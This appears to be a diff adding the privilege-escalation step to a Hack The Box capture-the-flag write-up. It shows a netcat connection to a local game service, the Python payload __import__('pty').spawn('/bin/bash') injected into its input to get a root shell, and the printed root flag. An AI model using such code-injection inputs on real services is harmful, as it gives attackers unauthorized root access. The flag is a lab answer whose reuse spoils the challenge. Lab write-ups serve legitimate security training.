@@ -100,4 +100,19 @@ user/12345
 ## 提权
 
 ```bash
+(remote) www-data@htb:/tmp$ nc 127.0.0.1 1337
+Jotaro put himself in jail!
+Can you convince him to get out?
+Defeat him!
+Your attacks are:
+0: Cross Fire Hurricane
+Damage: D5
+1: Red Bind
+Damage: S2
+2: Punch
+Damage: D1
+__import__("pty").spawn("/bin/bash")
+root@htb:~# cat /root/flag.txt
+cat /root/flag.txt
+cf66d5355ca3252cca44190f2a05573d
 ```
